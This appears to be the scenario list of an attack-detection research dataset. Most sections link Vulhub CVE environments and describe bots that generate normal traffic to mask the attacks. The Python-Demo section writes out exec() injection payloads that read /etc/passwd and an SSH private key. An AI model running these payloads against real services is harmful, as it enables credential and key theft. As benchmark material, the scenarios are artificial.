 # Scenario Descriptions

Most of the vulnerability scenarios are sourced from Vulhub (vulhub.org). Therefore, for the attack steps related to these scenarios, we have directly provided the URLs to their attack descriptions.

## 1. Python-Demo

Description: A self-designed Python FastAPI application.

### Attack Steps

Refer to `example/python-demo/users/attack2.py`. The attack steps are as follows:

```
exec("import os;global a;a=os.path.abspath(os.curdir)")
exec("import os;import subprocess;os.chdir('..');os.chdir('..');os.chdir('..');os.chdir('tmp');subprocess.run(['touch', 'flag'])")
exec("import os;import subprocess;os.chdir('..');os.chdir('etc');global a;f=open('passwd','r');a=f.read();f.close()")
exec("import os;os.chdir('..');os.chdir('/');os.chdir('app');global a;a=os.listdir('.')")
exec("import os;global a;a=os.listdir('.ssh')")
exec("import os;os.chdir('.ssh');global a;f=open('id_ed25519','r');a=f.read();f.close()")
exec("import os;os.chdir('..');os.chdir('data');global a;a=os.listdir('.')")
exec("import os;global a;f=open('important_data.txt','r');a=f.read();f.close()")
```

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `users/test2.py`: Repeatedly executes registration and login functions, and randomly performs operations such as viewing items and checking balance.
- `users/test2_admin.py`: Repeatedly executes administrator-related operations, including admin login, modifying item prices, and performing normal operations on APIs involved in attacks.

## 2. CVE-2022-4223

Description URL: https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2022-4223

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/normal_1.py`: Login, then repeatedly execute APIs involved in attacks and verify binary paths.
- `bot/normal_2.py`: Repeatedly execute login and file upload operations.

## 3. CVE-2023-5002

Description URL: https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2023-5002

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/normal_1.py`: Login, then repeatedly execute APIs involved in attacks and verify binary paths.
- `bot/normal_2.py`: Repeatedly execute login and file upload operations.

## 4. Owasp Juice Shop

Description URL: https://github.com/juice-shop/juice-shop

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/behaviors/normal.py`: We implemented a user state machine and 13 types of normal user behaviors. Following the state machine, we execute different user operations such as topping up, filing complaints, editing personal information, etc.

## 5. CVE-2019-10758

Description URL: https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.emac
- `bot/normal_1.py`: Call attack-related APIs, validate document legitimacy.
- `bot/normal_2.py`: Repeatedly attempt to download and backup logs.

## 6. CVE-2018-17246

Description URL: https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 7. CVE-2023-23752

Description URL: https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2023-23752

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/normal_1.py`: Repeatedly login and upload images.
- `bot/normal_2.py`: Call APIs involved in attacks, attempt to view user information (fails).

## 8. CVE-2017-8917

Description URL: https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 9. CVE-2015-8562

Description URL: https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/normal_1.py`: Repeatedly login and upload images.
- `bot/normal_2.py`: Call APIs involved in attacks, attempt to view user information (fails).

## 10. CVE-2021-43008

Description URL: https://github.com/vulhub/vulhub/tree/master/adminer/CVE-2021-43008

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 11. CVE-2021-26120

Description URL: https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 12. CVE-2019-9053

Description URL: https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 13. CVE-2018-1000533

Description URL: https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/custom_normal.py`: Repeatedly perform various different git operations.

## 14. CVE-2019-17558

Description URL: https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-17558

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/custom_normal.py`: Repeatedly perform various different solr operations.

## 15. CVE-2019-0193

Description URL: https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/custom_normal.py`: Repeatedly attempt to import solr.

## 16. CVE-2017-12629-XXE

Description URL: https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 17. CVE-2017-12629-RCE

Description URL: https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 18. CVE-2024-38856

Description URL: https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-38856

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 19. CVE-2023-51467

Description URL: https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-51467

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 20. CVE-2023-49070

Description URL: https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-49070

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 21. CVE-2020-9496

Description URL: https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/custom_normal.py`: Repeatedly perform normal ofbiz operations, such as `test xml rpc add`.

## 22. CVE-2024-45195

Description URL: https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-45195

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 23. CVE-2024-45507

Description URL: https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-45507

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.
- `bot/custom_normal.py`: Repeatedly perform normal ofbiz operations, such as `forgot password`.

## 24. CVE-2023-25157

Description URL: https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2023-25157

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 25. CVE-2024-36401

Description URL: https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 26. CVE-2023-38646

Description URL: https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2023-38646

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 27. CVE-2021-41277

Description URL: https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2021-41277

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `bot/gen.py`: Uses the script provided by https://github.com/ReconInfoSec/web-traffic-generator.
  - Just a simple (poorly written) Python script that aimlessly "browses" the internet by starting at pre-defined `ROOT_URLS` and randomly "clicking" links on pages until the pre-defined `MAX_DEPTH` is met.

## 28. Sandworm

Description URL: https://github.com/center-for-threat-informed-defense/adversary_emulation_library

### Normal Traffic Generation

We simultaneously run the following scripts to generate normal traffic and mask the attack behavior:

- `attacker/normal.py`： Simulate administrator login to the server and randomly execute 18 common system administration commands.

## 29. 10-step chained attack

Description: We selected the following scenarios from the above:

- python-demo
- owasp juice shop
- cve-2024-36401
- cve-2018-1000533
- cve-2015-8562
- cve-2018-17246
- cve-2023-38646
- cve-2019-10758
- cve-2024-45507
- cve-2022-4223
- cve-2019-17558

These scenarios are combined in random order and used for pivot attacks. For specific attack methods, please refer to the paper.

### Normal Traffic Generation

We have integrated the normal behavior scripts from the above scenarios and execute them separately within each container.
